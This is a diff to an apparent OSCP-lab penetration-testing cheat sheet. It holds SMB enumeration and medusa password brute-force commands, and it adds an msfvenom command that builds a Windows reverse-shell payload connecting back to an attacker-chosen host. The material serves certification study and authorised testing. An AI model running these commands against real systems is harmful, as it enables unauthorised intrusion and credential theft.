@@ -12,8 +12,12 @@ Enumerate if any user has info:
     nmap <ip> --script=smb-enum-shares
 **SMB USER/CHECK**
 
-    medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4				
+    medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4	
+## Windows Payloads
+    
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <any desired format, example: jsp, php..> > file.<desired format>
 ## Kernel Cross-Compiling
+
 Really helpful if you are facing an old-school 32-bit box (believe me, there's tons of them in OSCP Labs xd)
 Choose the --static option wisely https://stackoverflow.com/questions/8692128/static-option-for-gcc
 
